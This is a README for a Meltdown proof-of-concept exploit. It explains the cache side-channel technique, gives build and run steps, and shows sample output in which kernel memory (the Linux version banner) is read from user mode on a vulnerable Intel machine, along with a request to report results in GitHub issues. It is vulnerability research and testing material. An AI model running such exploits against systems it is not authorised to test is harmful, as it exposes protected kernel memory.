# MELTDOWN EXPLOIT POC

Speculative optimizations execute code in a non-secure manner leaving data
traces in microarchitecture such as cache.

Lipp et. al 2018 published their code 2018-01-09 at
https://github.com/IAIK/meltdown. Look at their paper for details:
https://meltdownattack.com/meltdown.pdf.

Can only dump `linux_proc_banner` at the moment, since requires accessed memory
to be in cache and `linux_proc_banner` is cached on every read from
`/proc/version`. Might work with `prefetch`. Works with `sched_yield`.

Build with `make`, run with `./run.sh`.

Can't defeat KASLR yet, so you may need to enter your password to find
`linux_proc_banner` in the `/proc/kallsyms` (or do it manually).

Flush+Reload and target array approach taken from spectre paper https://spectreattack.com/spectre.pdf
implemented following clues from https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/.

Pandora's box is open.

Result:
```
$ make
cc -O2 -msse2   -c -o meltdown.o meltdown.c
cc   meltdown.o   -o meltdown
$ ./run.sh 
looking for linux_proc_banner in /proc/kallsyms
cached = 30, uncached = 349, threshold 102
read ffffffff8f800060 = 25 % (score=314/1000)
read ffffffff8f800061 = 73 s (score=301/1000)
read ffffffff8f800062 = 20   (score=242/1000)
read ffffffff8f800063 = 76 v (score=338/1000)
read ffffffff8f800064 = 65 e (score=280/1000)
read ffffffff8f800065 = 72 r (score=326/1000)
read ffffffff8f800066 = 73 s (score=388/1000)
read ffffffff8f800067 = 69 i (score=304/1000)
read ffffffff8f800068 = 6f o (score=240/1000)
read ffffffff8f800069 = 6e n (score=301/1000)
read ffffffff8f80006a = 20   (score=295/1000)
read ffffffff8f80006b = 25 % (score=329/1000)
read ffffffff8f80006c = 73 s (score=268/1000)
read ffffffff8f80006d = 20   (score=197/1000)
read ffffffff8f80006e = 28 ( (score=239/1000)
read ffffffff8f80006f = 64 d (score=154/1000)
VULNERABLE
PLEASE POST THIS TO https://github.com/EsenkayShady/meltdown-poc/issues/1
VULNERABLE ON
4.14.0-kali1-amd64 #1 SMP Debian 4.14.2-1kali1 (2017-12-04) unknown
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 78
model name	: Intel(R) Core(TM) i5-6300U CPU @ 2.40GHz
stepping	: 3
microcode	: 0xba
cpu MHz		: 2500.000
cache size	: 3072 KB
physical id	: 0

```

Post Vulnerable and Invulnerable Machines in Issues in the folloving links

Not vulnerable- https://github.com/EsenkayShady/meltdown-poc/issues/1
Vulnerable- https://github.com/EsenkayShady/meltdown-poc/issues/2
# meltdown-poc
